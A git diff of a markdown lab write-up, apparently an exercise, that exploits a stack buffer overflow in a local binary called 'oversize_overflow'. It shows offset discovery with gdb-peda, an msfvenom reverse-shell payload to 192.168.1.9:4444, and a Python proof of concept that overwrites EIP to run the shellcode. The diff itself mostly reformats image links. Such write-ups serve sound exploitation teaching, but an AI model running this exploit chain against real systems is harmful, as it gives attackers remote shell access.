@@ -43,12 +43,16 @@ Let's make 500 bytes of `A` and send to program to see if it crash
 ```bash
 $ python3 -c "print('A'*500)" | ./oversize_overflow
 ```
-![[image1.png]]
+
+![image1.png](image1.png)
+
 As we can see, the program works good, so let's try with bigger size:
 ```bash
 $ python3 -c "print('A'*700)" | ./oversize_overflow
 ```
-![[image2.png]]
+
+![image2.png](image2.png)
+
 At this time, the program crashed with 700 bytes size. Now on, using the gdb debugger to determine and get exact offset and override the `EIP`:
 ```bash
 $ gdb -q oversize_overflow
@@ -60,25 +64,34 @@ gdb-peda$ pattern create 700 1.txt
 Writing pattern of 700 chars to filename "1.txt"
 gdb-peda$ r < 1.txt
 ```
-![[image3.png]]
+
+![image3.png](image3.png)
+
 Here is the reuslt, and we can see the `EIP` (`0x4e734138`) point to invalid address, so the program crashed. Now, we are going to get exact size:
+
 ```sh
 gdb-peda$ pattern offset 0x4e734138
 1316176184 found at offset: 516
 ```
+
 Get back to terminal, create the basic exploit to see if it overrided:
 ```sh
 $ python -c "print('A'*516+'B'*4+'C*100')" > input.txt
 ```
+
 Run the input file in gdb debugger, we can see the `EIP` overrided with 0x42424242 (meant BBBB). We are completely done with overriding the `EIP`.
-![[image4.png]]
+![image4.png](image4.png)
+
 ### 2.3 Execute the Shellcode
 #### 2.3.1 Shellcode generation
 To generate the shellcode, in this section we will use msfvernom to genterate it
+
 ```bash
 $ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.9 lport=4444 -b "\x00" -f python -o payload.py --platform linux -a x86
 ```
+
 - Options description:
+
 ```sh
 -p: Which mean payload
 -b: bad characters caused crash
@@ -89,20 +102,28 @@ $ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.9 lport=4444 -b "\x00"
 lhost: listening host
 lport: listening port
 ```
-![[image5.png]]
+
+![image5.png](image5.png)
 
 #### 2.3.2 Finding the returning address to execute the shellcode
 We got the shellcode, now we need to find the address to override the `EIP` and point it to the shellcode to make it execute. To do this, we will make `A` buffer and open the `gdb`.
+
 ```bash
 $ python -c "print('A'*700)" > input.txt
 
 gdb-peda$ r < input.txt
 ```
+
 After run, the program will be crashed, use `x/20wx $esp-0x230` to show stack similar with below picture.
-![[image6.png]]
+
+![image6.png](image6.png)
+
 In the picture, we can see the buffer start in `0xffffd030 + 0x8`, so `0xffffd038` will be our return address
+
 #### 2.3.3 Proof of Concept (PoC)
+
 We will edit the `payload.py` which we've already created above:
+
 ```python
 #!/usr/bin/python3
 import struct
@@ -125,8 +146,14 @@ with open('input.txt', 'wb') as file:
     payload = nop + buf + junk * (offset - 16 -len(buf)) + ret_add
     file.write(payload)
 ```
-After run we have text file `input.txt`![[image7.png]]
-Finally, we got the result, shellcode is connected![[image8.png]]
-![[image9.png]]
+After run we have text file `input.txt`
+
+![image7.png](image7.png)
+
+Finally, we got the result, shellcode is connected
+
+![image8.png](image8.png)
+
+![image9.png](image9.png)
 
 ------------------------------------------------------- Done -------------------------------------------------------
